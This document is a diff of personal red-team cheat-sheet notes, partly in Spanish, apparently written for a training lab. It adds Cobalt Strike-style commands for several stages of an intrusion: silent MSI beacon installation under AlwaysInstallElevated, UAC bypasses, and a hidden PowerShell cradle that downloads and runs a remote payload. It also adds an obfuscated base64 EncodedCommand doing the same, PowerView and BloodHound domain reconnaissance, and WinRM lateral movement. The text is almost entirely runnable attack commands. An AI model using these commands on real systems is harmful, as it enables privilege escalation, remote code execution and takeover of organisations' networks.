@@ -248,19 +248,38 @@ run sc start Vuln-Service-3
 connect localhost 4444
 beacon por TCP si es para escalada de privilegios
 
+#Alwayd Installed Elevated
+execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
+instalador MSI
+upload C:\Payloads\BeaconInstaller\Debug\BeaconInstaller.msi
+run msiexec /i BeaconInstaller.msi /q /n
+connect localhost 4444
+
+#UAC Bypass
+elevate
+execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe uac
+execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe [*] In medium integrity but user is a local administrator- UAC can be bypassed.
+elevate uac-token-duplication tcp-4444-local
+runasadmin
+runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://ip:port/b'))"
+connect localhost 4444
+execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe TokenPrivileges
+elevate svc-exe tcp-4444-local
+
+#Domain Reconnaissance
 #POWERVIEW
 powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
 powershell Get-Domain
 powershell Get-DomainController | select Forest, Name, OSVersion | fl
 powershell Get-ForestDomain
 powershell Get-DomainPolicyData | select -ExpandProperty SystemAccess
-powershell Get-DomainUser -Identity nlamb -Properties DisplayName, MemberOf | fl
+powershell Get-DomainUser -Identity user -Properties DisplayName, MemberOf | fl
 powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
 powershell Get-DomainUser -Identity nlamb -Properties DisplayName, MemberOf | fl
 powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
-powershell Get-DomainOU -Properties Name | sort -Property Name
+powershell Get-DomainOU -Properties Name | sort -Property Name "controladores de dominios . servidores , estaciones de trabajo"
 powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
-powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
+powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName miembros de un grupo especifico
 powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
 powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
 powershell Get-DomainGPO -Properties DisplayName | sort -Property DisplayName
@@ -275,11 +294,31 @@ execute-assembly C:\Tools\SharpView\SharpView\bin\Debug\SharpView.exe Get-Domain
 execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"
 execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c DcOnly
 execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c DcOnly -d cyberbotic.io
+execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"
+
+#BloodHound
+execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c DcOnly
+execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c DcOnly -d cyberbotic.io
+download file.zip
+ver descargar view downloads
+SPN
+MATCH (u:User {hasspn:true}) RETURN u
+MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
+MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
 
 #LATERAL MOVEMENT
 jump
+jump winrm64 srv-1 smb
+
 remote-exec
 execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe powershell -computername=srv-1
+powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAyADEAMwAxADAALwAnACkA
+
+
+#PowerShell Remoting
+remote-exec winrm srv-1 (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+
+
 
 netlogons
 ps
